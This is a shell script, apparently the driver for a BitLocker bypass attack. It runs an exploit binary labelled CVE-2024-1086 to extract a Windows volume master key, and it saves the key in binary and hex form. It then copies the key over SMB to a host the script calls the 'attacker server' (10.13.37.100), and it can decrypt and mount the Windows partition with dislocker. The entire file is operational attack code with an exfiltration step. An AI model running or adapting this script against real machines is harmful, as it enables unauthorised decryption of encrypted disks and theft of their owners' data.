#!/bin/ash

# === Function definitions ===

echoInfo() {
    echo -e "\e[34;1m[+]\e[0m \e[34mInfo: $1\e[0m" >&2
}

echoError() {
    echo -e "\e[31;1m[!]\e[0m \e[31mError: $1\e[0m" >&2
}

echoWarning() {
    echo -e "\e[33;1m[!]\e[0m \e[33mWarning: $1\e[0m" >&2
}

show_usage() {
    echoInfo "Usage: run-exploit [options] [partition]"
    echoInfo "Options:"
    echoInfo "  -t, --no-transfer    Do not transfer the VMK to the attacker server"
    echoInfo "  -m, --mount <disk>   Mount the disk to /root/mnt"
    echoInfo "  -f, --force          Force run the exploit even if VMK already exists"
}

check_partition_exists() {
    local partition=$1
    if [ ! -e "$partition" ]; then
        echoError "Partition $partition does not exist"
        return 1
    fi
    return 0
}

detect_windows_partition() {
    fdisk -l 2>/dev/null | grep "Microsoft basic data" | cut -d' ' -f1 | head -n 1
}

run_exploit() {
    local force=$1

    # Check if VMK already exists and handle based on force flag
    if [ -f /root/vmk.dat ] && [ $force -eq 0 ]; then
        echoInfo "VMK already exists. Skipping exploit. Use -f to force re-run."
        return 0
    elif [ -f /root/vmk.dat ] && [ $force -eq 1 ]; then
        echoInfo "VMK already exists but force flag is set. Re-running exploit..."
    else
        echoInfo "No existing VMK found. Running exploit..."
    fi

    echoInfo "Exploiting CVE-2024-1086 and obtaining VMK..."
    su bitpix -c exploit

    # Check if vmk.dat was created
    if [ ! -f /root/vmk.dat ]; then
        echoError "Exploit failed: vmk.dat not found"
        return 1
    fi

    # Save VMK in both binary and ASCII formats
    cp /root/vmk.dat /root/VMK.dat
    hexdump -ve '1/1 "%02x "' /root/VMK.dat > /root/VMK.txt

    echoInfo "VMK saved in binary format as /root/VMK.dat and ASCII format as /root/VMK.txt!"
    cat /root/VMK.txt

    return 0
}

transfer_vmk() {
    echoInfo "Copying VMK to attacker server..."

    mkdir -p /root/smb
    if ! mount -t cifs //10.13.37.100/smb /root/smb -o guest,vers=2.0; then
        echoError "Failed to connect to SMB share"
        return 1
    fi

    cp /root/VMK.dat /root/smb/
    cp /root/VMK.txt /root/smb/

    echoInfo "Copied VMK to attacker server!"
    umount /root/smb
    return 0
}

mount_disk() {
    local partition=$1

    # Check if VMK exists
    if [ ! -f /root/VMK.dat ]; then
        echoError "VMK.dat not found. Cannot mount disk."
        return 1
    fi

    echoInfo "Unlocking Bitlocker partition $partition..."

    # Check if already mounted at target location
    if mount | grep -q "/root/mnt"; then
        echoWarning "Partition already mounted at /root/mnt"
        echoInfo "Already mounted data:"
        ls -la /root/mnt
        echoInfo "Use 'umount /root/mnt' first if you want to remount"
        return 0
    fi

    # Clean up existing dislocker mount if it exists
    if mount | grep -q "/root/bitlocker"; then
        echoWarning "Unmounting existing /root/bitlocker"
        umount /root/bitlocker
    fi

    mkdir -p /root/bitlocker
    if ! dislocker -V "$partition" -K /root/VMK.dat -vvv -- /root/bitlocker; then
        echoError "Failed to unlock Bitlocker partition"
        return 1
    fi

    mkdir -p /root/mnt
    if ! mount -t ntfs-3g -o loop /root/bitlocker/dislocker-file /root/mnt; then
        echoError "Failed to mount NTFS filesystem"
        return 1
    fi

    echoInfo "Mounted partition into /root/mnt!"
    ls -la /root/mnt
    echo ""
    echoInfo "Don't forget to unmount using: umount /root/mnt"
    return 0
}

cleanup_smb() {
    # Only unmount SMB if it's mounted
    if mount | grep -q "/root/smb"; then
        umount /root/smb 2>/dev/null
    fi
}

# === Main script ===

# Parse arguments
PARTITION=""
NO_TRANSFER=0
MOUNT_DISK=0
FORCE=0

while [ $# -gt 0 ]; do
    case "$1" in
        -t|--no-transfer)
            NO_TRANSFER=1
            shift
            ;;
        -m|--mount)
            MOUNT_DISK=1
            if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
                PARTITION="$2"
                shift 2
            else
                echoError "Argument for $1 is missing"
                show_usage
                exit 1
            fi
            ;;
        -f|--force)
            FORCE=1
            shift
            ;;
        -h|--help)
            show_usage
            exit 0
            ;;
        *)
            if [ -z "$PARTITION" ]; then
                PARTITION="$1"
            fi
            shift
            ;;
    esac
done

# Check if partition is specified
if [ -z "$PARTITION" ]; then
    # Try to identify Windows partitions
    DETECTED_PARTITION=$(detect_windows_partition)
    if [ -z "$DETECTED_PARTITION" ]; then
        echoError "No partition specified and no Windows partitions detected"
        show_usage
        exit 1
    else
        PARTITION=$DETECTED_PARTITION
        echoInfo "No partition specified, using detected Windows partition: $PARTITION"
    fi
fi

# Check if the specified partition exists
if ! check_partition_exists "$PARTITION"; then
    exit 1
fi

# Run the exploit with force flag
if ! run_exploit $FORCE; then
    exit 1
fi

# Transfer VMK if not disabled
if [ $NO_TRANSFER -eq 0 ]; then
    # Set up trap just for the SMB share
    trap cleanup_smb EXIT
    transfer_vmk
    # Clear the trap after transfer is done
    trap - EXIT
fi

# Mount the disk if requested
if [ $MOUNT_DISK -eq 1 ]; then
    mount_disk "$PARTITION"
fi

echoInfo "Exploit completed successfully!"
